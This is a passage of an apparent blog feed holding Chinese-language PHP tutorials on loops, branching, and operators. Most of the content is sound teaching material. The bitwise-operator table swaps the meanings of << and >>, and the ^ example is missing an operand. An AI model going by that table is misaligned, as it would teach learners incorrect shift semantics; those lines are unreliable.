&quot;Sat&quot;: echo &quot;星期六&quot;;  break;        </span><br><span class="line">        case &quot;Sun&quot;: echo &quot;星期日&quot;;  break;        </span><br><span class="line">    &#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="巢状条件分支结构"><a href="#巢状条件分支结构" class="headerlink" title="巢状条件分支结构"></a>巢状条件分支结构</h3>巢状式条件分支结构就是<code>if</code>语句的嵌套，即指<code>if</code>或<code>else</code>后面的语句块中又包含<code>if</code>语句。<code>if</code>语句可以无限层地嵌套在其他<code>if</code>语句，这给程序的不同部分的条件执行提供了充分的弹性。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;88;</span><br><span class="line">echo &quot;数学成绩:&quot;.$a;</span><br><span class="line">if($a&gt;&#x3D;60)&#123;</span><br><span class="line">if($a&gt;&#x3D;70)&#123;</span><br><span class="line">if($a&gt;&#x3D;90)&#123;</span><br><span class="line">echo &quot;不错喔!!这次数学成绩甲等!!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;还可以...这次数学成绩乙等!!&quot;; </span><br><span class="line">&#125;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line">     echo &quot;勉勉强强及格边缘...这次数学成绩丙等!!&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;有待下次努力...数学成绩不及格!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>当<code>while</code>循环语句中表达式<strong>循环控制语句</strong>的结果为真时，程序将反复执行同一段程序：<strong>循环体while中的语句或语句序列</strong>，直到满足一定的条件<strong>表达式的结果为假时</strong>后才停止执行该段程序。</p><p><img src="https://qiniu.hzktester.top/tp2020102104.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;求1到100的累加。</span><br><span class="line">$i&#x3D;1;</span><br><span class="line"> $sum&#x3D;0;</span><br><span class="line">while($i&lt;&#x3D;100)</span><br><span class="line">&#123;</span><br><span class="line">$sum+&#x3D;$i;</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line">echo $sum;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do while循环"></a>do while循环</h3><p>序会先执行<code>do</code>语句体中的语句<strong>循环体</strong>，然后再检查表达式<strong>循环控制语句</strong>的值，如果符合条件式<strong>值为真</strong>，就再进行<code>do</code> 语句体中的语句，直到条件不符合为止</p><ul><li><code>do-while</code>后面必须加上分号作为结束</li><li><code>do-while</code>与<code>while</code>的最大区别是先执行循环体然后再判断循环的控制条件</li></ul><h4 id="示例1：求1-100的累加"><a href="#示例1：求1-100的累加" class="headerlink" title="示例1：求1-100的累加"></a>示例1：求1-100的累加</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php&#x2F;&#x2F;求1到100的累加。</span><br><span class="line">$i&#x3D;1; </span><br><span class="line">$sum&#x3D;0;</span><br><span class="line">do&#123;</span><br><span class="line">   $sum+&#x3D;$i;</span><br><span class="line">      $i++;</span><br><span class="line">&#125;while($i&lt;&#x3D;100);</span><br><span class="line">echo $sum;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="示例2：使用while循环嵌套输出表格"><a href="#示例2：使用while循环嵌套输出表格" class="headerlink" title="示例2：使用while循环嵌套输出表格"></a>示例2：使用while循环嵌套输出表格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;table align&#x3D;&quot;center&quot; border&#x3D;&quot;1&quot; width&#x3D;600&gt;</span><br><span class="line">            &lt;caption&gt;&lt;h1&gt;使用while循环嵌套输出表格&lt;&#x2F;h1&gt;&lt;&#x2F;caption&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                $out &#x3D; 0;                                   &#x2F;&#x2F;外层循环需要计数的累加变量</span><br><span class="line">                while( $out &lt; 10 ) &#123;                        &#x2F;&#x2F;指定外层循环，并且循环次数为10次</span><br><span class="line">                    $bgcolor &#x3D; $out%2 &#x3D;&#x3D; 0 ? &quot;#FFFFFF&quot; : &quot;#DDDDDD&quot;;</span><br><span class="line">                    echo &quot;&lt;tr bgcolor&#x3D;&quot;.$bgcolor.&quot;&gt;&quot;;       &#x2F;&#x2F;执行一次则输出一行并指定背景颜色</span><br><span class="line">                    $in &#x3D; 0;                                &#x2F;&#x2F;内层循环需要计数的累加变量</span><br><span class="line">                    while( $in &lt; 10 ) &#123;                     &#x2F;&#x2F;指定内层循环，并且循环次数为10次</span><br><span class="line">                        echo &quot;&lt;td&gt;&quot;.($out*10+$in).&quot;&lt;&#x2F;td&gt;&quot;;  &#x2F;&#x2F;执行一次，输出一个单元格</span><br><span class="line">                        $in++;                              &#x2F;&#x2F;内层的计数变量累加</span><br><span class="line">                    &#125;</span><br><span class="line">                    echo &quot;&lt;&#x2F;tr&gt;&quot;;                           &#x2F;&#x2F;输出行关闭标记</span><br><span class="line">                    $out++;                                 &#x2F;&#x2F;外层的计数变量累加</span><br><span class="line">                &#125;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;table&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102106.png" alt="image"></p><h3 id="fro循环"><a href="#fro循环" class="headerlink" title="fro循环"></a>fro循环</h3><p><code>for</code>循环语句中<strong>表达式1为循环初始条件</strong>；<strong>表达式2为循环控制条件</strong>；<strong>表达式3为控制变量递增</strong>；语句或语句序列为循环体。</p><p><img src="https://qiniu.hzktester.top/tp2020102105.png" alt="image"></p><h4 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F;使用花括号“&#123;&#125;”将代码块括起来，通常代码块为一条时可以不加花括号</span><br><span class="line">    for( $i &#x3D; 1;  $i &lt;&#x3D; 10;  $i++ ) &#123;</span><br><span class="line">        echo &quot;这是第&lt;b&gt; $i &lt;&#x2F;b&gt;次循环执行输出的结果&lt;br&gt;&quot;;  </span><br><span class="line">    &#125;</span><br><span class="line">    $i &#x3D; 1; &#x2F;&#x2F;将for语句中第一部分初始化提出来，放到for前面执行，但for语句中的分号要保留</span><br><span class="line">    for( ;  $i &lt;&#x3D; 10;  $i++ ) &#123;</span><br><span class="line">        echo &quot;这是第&lt;b&gt; $i &lt;&#x2F;b&gt;次循环执行输出的结果&lt;br&gt;&quot;;  </span><br><span class="line">    &#125;</span><br><span class="line">    $i &#x3D; 1; &#x2F;&#x2F;再将第三部分的增量提出来，放到for语句的执行体最后，但也要将分号保留</span><br><span class="line">    for( ;  $i &lt;&#x3D; 10; ) &#123;</span><br><span class="line">        echo &quot;这是第&lt;b&gt; $i &lt;&#x2F;b&gt;次循环执行输出的结果&lt;br&gt;&quot;;</span><br><span class="line">        $i++;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $i &#x3D; 1;</span><br><span class="line">    for( ; ; ) &#123;</span><br><span class="line">        if( $i &gt; 10 )</span><br><span class="line">            break;</span><br><span class="line">        echo &quot;这是第&lt;b&gt; $i &lt;&#x2F;b&gt;次循环执行输出的结果&lt;br&gt;&quot;;</span><br><span class="line">        $i++;   </span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102107.png" alt="image"></p><h2 id="特殊流程控制语句"><a href="#特殊流程控制语句" class="headerlink" title="特殊流程控制语句"></a>特殊流程控制语句</h2><h3 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h3><p>我们之前在<code>switch</code>条件判断中已经使用过<code>break</code> 关键字，它会使得程序流程离开<code>switch</code>本体中的语句，如果<code>break</code>使用在 <code>for</code>、<code>while</code> 或 <code>do-while</code> 循环结构中时，将会使得程序<strong>跳出该层循环</strong>。</p><h3 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h3><p><code>continue</code>的作用与<code>break</code>有点类似，<code>continue</code>若使用在<code>for</code>、<code>while</code>或 <code>do-while</code>循环结构中，当程序执行至<code>continue</code> 时，之后的语句将直接被略过，而直接<strong>执行下一次的循环动作</strong>。</p><h3 id="exit-函数和die-函数"><a href="#exit-函数和die-函数" class="headerlink" title="exit()函数和die()函数"></a>exit()函数和die()函数</h3><p>当前的脚本中只要执行到<code>exit</code>语句，而不管它在哪个结构中都会直接退出当前脚本。<code>exit</code>是一个函数，当前使用过的<code>die()</code>函数就是<code>exit()</code>的别名。可以带参数输出一条消息，并退出当前脚本。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;流程控制概述&quot;&gt;&lt;a href=&quot;#流程控制概述&quot; class=&quot;headerlink&quot; title=&quot;流程控制概述&quot;&gt;&lt;/a&gt;流程控制概述&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;任何 &lt;code&gt;PHP&lt;/code&gt; 脚本都是由一系列语句构成的。一条语句可以是一个赋值语句，一个函数调用，一个循环，甚至一个什么也不做的（空语句）条件语句。语句通常以分号结束。此外，还可以用花括号将一组语句封装成一个语句组。语句组本身可以当作是一行语句。&lt;/li&gt;
&lt;li&gt;在任何一门程序设计语言中，都需要支持满足程序结构化所需要的三种基本结构:&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;顺序结构&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分支结构（选择结构）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;循环结构&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;分支结构&quot;&gt;&lt;a href=&quot;#分支结构&quot; class=&quot;headerlink&quot; title=&quot;分支结构&quot;&gt;&lt;/a&gt;分支结构&lt;/h2&gt;&lt;h3 id=&quot;单一条件分支结构-if&quot;&gt;&lt;a href=&quot;#单一条件分支结构-if&quot; class=&quot;headerlink&quot; title=&quot;单一条件分支结构(if)&quot;&gt;&lt;/a&gt;单一条件分支结构(if)&lt;/h3&gt;&lt;p&gt;当条件表达式的值为真&lt;code&gt;true&lt;/code&gt;时，&lt;code&gt;PHP&lt;/code&gt;将执行语句组，相反条件表达式的值为假&lt;code&gt;false&lt;/code&gt;时，&lt;code&gt;PHP&lt;/code&gt;将不执行语句组，忽略语句组执行下面的语句。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$a&amp;#x3D;5;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$b&amp;#x3D;3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if ($a &amp;gt; $b)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echo &amp;quot;a &amp;gt; b&amp;quot;; &amp;#x2F;&amp;#x2F;如果变量a的值大于b的值则会输出：a大于b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $x&amp;#x3D;10;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $y&amp;#x3D;20;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if($x&amp;lt;$y)&amp;#123;          &amp;#x2F;&amp;#x2F;判断是否x小于y。多条语句需要使用&amp;#123; &amp;#125;括起来。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         $t&amp;#x3D;$x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         $x&amp;#x3D;$y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         $y&amp;#x3D;$t;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var_dump($x&amp;gt;$y);  &amp;#x2F;&amp;#x2F;输出：bool(true)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;双向条件分支结构-else从句&quot;&gt;&lt;a href=&quot;#双向条件分支结构-else从句&quot; class=&quot;headerlink&quot; title=&quot;双向条件分支结构(else从句)&quot;&gt;&lt;/a&gt;双向条件分支结构(else从句)&lt;/h3&gt;&lt;p&gt;&lt;code&gt;if-else&lt;/code&gt; 条件判断与 &lt;code&gt;if&lt;/code&gt; 条件判断类似，所不同的是，&lt;code&gt;if-else&lt;/code&gt; 语&lt;br&gt;句的条件表达式值为真&lt;code&gt;true&lt;/code&gt;时，会执行 &lt;code&gt;if&lt;/code&gt; 的本体语句&lt;strong&gt;语句组1&lt;/strong&gt;，&lt;br&gt;而条件表达式值为假&lt;code&gt;false&lt;/code&gt;时，则执行 &lt;code&gt;else&lt;/code&gt; 的本体语句&lt;strong&gt;语句组2&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102101.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;if(false)&amp;#123;  &amp;#x2F;&amp;#x2F; 真区间&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	echo 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; else &amp;#123;    &amp;#x2F;&amp;#x2F; 假区间&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	echo 2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="PHP基础" scheme="https://hzktester.top/categories/PHP%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="PHP基础" scheme="https://hzktester.top/tags/PHP%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>标记、注释、运算符、表达式、变量</title>
    <link href="https://hzktester.top/posts/79ae17a0.html"/>
    <id>https://hzktester.top/posts/79ae17a0.html</id>
    <published>2020-10-20T14:24:00.000Z</published>
    <updated>2020-10-20T14:26:18.929Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP语言标记"><a href="#PHP语言标记" class="headerlink" title="PHP语言标记"></a>PHP语言标记</h2><ul><li>以<code>&lt;?php</code>开始<code>?&gt;</code>结束标记是标准风格，这是<code>PHP</code>推荐使用的标记风格。</li><li>以<code>&lt;script language=&quot;php&quot;&gt;</code>开始和<code>&lt;/script&gt;</code>结束是长风格标记，这种标记最长，总是可用的，但我们并不常用。</li><li>以<code>&lt;?</code>开始和以<code>?&gt;</code>结束标记是简短风格的标记，是最简单的，但是系统管理员偶尔会禁用掉它，因为它会干扰<code>XML</code>文档的声明。只用通过<code>php.ini</code>配置文件中的指令<code>short_open_tag</code>打开后就可以使用。</li><li>以<code>&lt;%</code>开始和以<code>%&gt;</code>结束标记是<code>ASP</code>风格的标记，可以在<code>php.ini</code>配置文件设定中启用了<code>asp_tags</code>选项就可以使用它（默认是禁用的），习惯了<code>ASP</code>风格的可以使用它。</li></ul><h2 id="PHP程序注释"><a href="#PHP程序注释" class="headerlink" title="PHP程序注释"></a>PHP程序注释</h2><p>PHP支持C、C＋＋和Shell脚本风格的注释，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;... ...单行注释</span><br><span class="line">&#x2F;* ... ... *&#x2F; 多行注释 （注意：不能嵌套）</span><br><span class="line"># ... ... 脚本注释</span><br></pre></td></tr></table></figure><h2 id="PHP中的运算符"><a href="#PHP中的运算符" class="headerlink" title="PHP中的运算符"></a>PHP中的运算符</h2><blockquote><p>运算符是可以通过给出的一或多个值（用编程行话来说，表达式）来产生另一个值（因而整个结构成为一个表达式）的东西。所以可以认为函数或任何会返回一个值（例如 print）的结构是运算符，而那些没有返回值的（例如 echo）是别的东西。 </p></blockquote><p>有三种类型的运算符：</p><ul><li><strong>一元运算符</strong>:只运算一个值，例如 <code>!</code>（取反运算符）或 <code>++</code>（加一运算符）。</li><li><strong>二元运算符</strong>:有两个操作数，PHP支持的大多数运算符都是这种。</li><li><strong>三元运算符</strong>：<code>? :</code>。它应该被用来根据一个表达式在另两个表达式中选择一个，而不是用来在两个语句或者程序路线中选择。把整个三元表达式放在扩号里是个很好的主意。</li></ul><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table><thead><tr><th>运算符</th><th>意义</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>+</td><td>加法运算</td><td>$a+$b</td><td>$a+$b的和</td></tr><tr><td>-</td><td>减法/取负运算</td><td>$a-$b</td><td>$a和$b的差</td></tr><tr><td>*</td><td>乘法运算</td><td>$a*$b</td><td>$a和$b的积</td></tr><tr><td>/</td><td>除法运算</td><td>$a/$b</td><td>$a和$b的商</td></tr><tr><td>%</td><td>求余运算符（取模运算）</td><td>$a%$b</td><td>$a和$b的余数</td></tr><tr><td>++</td><td>累加1</td><td>$a++或++$a</td><td>$a的值加1</td></tr><tr><td>--</td><td>递减1</td><td>$a--或--$a</td><td>$a的值减1</td></tr></tbody></table><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>有两个字符串运算符：</p><ul><li><code>.</code>连接运算符：返回其左右参数连接后的字符串</li><li><code>.=</code>连接赋值运算符：将右边参数附加到左边的参数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &quot;Hello &quot;;</span><br><span class="line">$b &#x3D; $a . “World!”; &#x2F;&#x2F; 现在$b的值： Hello World!</span><br><span class="line"></span><br><span class="line">$a &#x3D; &quot;Hello &quot;;</span><br><span class="line">$a .&#x3D; “World!”; &#x2F;&#x2F; 现在$a的值： Hello World!</span><br></pre></td></tr></table></figure><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3>基本的赋值运算符是<code>=</code>。一开始可能会以为它是“等于”，其实不是的。它实际上意味着把右边表达式的值赋给左边的运算数。</li></ul><table><thead><tr><th>运算符</th><th>意义</th><th>示例</th></tr></thead><tbody><tr><td>=</td><td>将一个值或表达式的结果赋给变量</td><td>$x=3</td></tr><tr><td>+=</td><td>将变量与所赋的值相加后的结果赋给该变量</td><td>$x+=3等价于$x=$x+3</td></tr><tr><td>-=</td><td>将变量与所赋的值相减后的结果赋给该变量</td><td>$x-=3等价于$x=$x-3</td></tr><tr><td>*=</td><td>将变量与所赋的值相乘后的结果赋给该变量</td><td>$x*=3等价于$x=$x*3</td></tr><tr><td>/=</td><td>将变量与所赋的值相除后的结果赋给该变量</td><td>$x/=3等价于$x=$x/3</td></tr><tr><td>%=</td><td>将变量与所赋的值求模后的结果赋给该变量</td><td>$x%=3等价于$x=$x%3</td></tr><tr><td>.=</td><td>将变量与所赋的值相连后的结果赋给该变量</td><td>$x.=”H”等价于$x=$x.“H”</td></tr></tbody></table><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>&gt;</td><td>大于</td><td>当左边大于右边时返回true，否则返回false</td><td>$a&gt;$b</td></tr><tr><td>&lt;</td><td>小于</td><td>当左边小于右边时返回true，否则返回false</td><td>$a&lt;$b</td></tr><tr><td>&gt;=</td><td>大于等于</td><td>当左边大于等于右边时返回true，否则false</td><td>$a&gt;=$b</td></tr><tr><td>&lt;=</td><td>小于等于</td><td>当左边小于等于右边时返回true，否则false</td><td>$a&lt;=$b</td></tr><tr><td>==</td><td>等于</td><td>两边操作数的值相等时返回true，否则false</td><td>$a==$b</td></tr><tr><td>===</td><td>全等于</td><td>两边值相等并且类型相等返回true，否则false</td><td>$a===$b</td></tr><tr><td>&lt;&gt;或!=</td><td>不等于</td><td>两边值不等时返回true，否则返回false</td><td>$a&lt;&gt;$b 或 $a!=$b</td></tr><tr><td>!==</td><td>非全等于</td><td>两边值与类型都相同时返回false，否则true</td><td>$a!==$b</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(9 &gt; 6);    </span><br><span class="line">&#x2F;&#x2F;如果 9大于6 它就返回true  否则就返回false</span><br><span class="line">var_dump(9 &#x3D;&#x3D;&#x3D; &#39;9&#39;) </span><br><span class="line">&#x2F;&#x2F; 全等于  一定要两种都相同  第一种就是值相同 第二种就是类型相同</span><br></pre></td></tr></table></figure><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>and或&amp;&amp;</td><td>逻辑与</td><td>当两边操作数都为true时，返回true，否则返回false</td><td>$a and $b 或 $a &amp;&amp; $b</td></tr><tr><td>or或||</td><td>逻辑或</td><td>当两边操作数都为false时，返回false，否则返回true</td><td>$a or $b 或 $a || $b</td></tr><tr><td>not或！</td><td>逻辑非</td><td>当操作数为true时返回false，否则返回true</td><td>not $b 或 !$b</td></tr><tr><td>xor</td><td>逻辑异或</td><td>当两边操作数只有一个为true时，返回true，否则返回false</td><td>$a xor $b</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_dump(true &amp;&amp; false);</span><br><span class="line">    &#x2F;&#x2F;判断两边是否为真  如果为真那么就返回true 否则就返回false</span><br><span class="line">var_dump(true || false);</span><br><span class="line">    &#x2F;&#x2F;只要有一方为真  那么都为真  都为false时候就为 false</span><br><span class="line">var_dump(!false);</span><br><span class="line">    &#x2F;&#x2F;取反</span><br><span class="line">var_dump(true xor false);</span><br><span class="line">    &#x2F;&#x2F;逻辑异或</span><br></pre></td></tr></table></figure><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与</td><td>只有参与运算的两位都为1时，运算结果才为1，否则为0.</td><td>$a &amp; $b</td></tr><tr><td>|</td><td>按位或</td><td>只有参与运算的两位都为0时，运算结果才为0，否则为1.</td><td>$a | $b</td></tr><tr><td>^</td><td>按位异或</td><td>只有参与运算的两位不同，运算结果才为1，否则为0.</td><td>^$b</td></tr><tr><td>~</td><td>按位非</td><td>将用二进制表示的操作数中的1变成0，0变成1.</td><td>～$a</td></tr><tr><td>&lt;&lt;</td><td>左移</td><td>将左边的操作数在内存中的二进制数据右移右边操作数指定的位数，右边移空的部分补上0</td><td>$a&lt;&lt;$b</td></tr><tr><td>&gt;&gt;</td><td>右移</td><td>将左边的操作数在内存中的二进制数据左移右边操作数指定的位数，左边移空的部分补上0</td><td>$a&gt;&gt;$b</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(true &amp; false);</span><br></pre></td></tr></table></figure><h3 id="其他运算符"><a href="#其他运算符" class="headerlink" 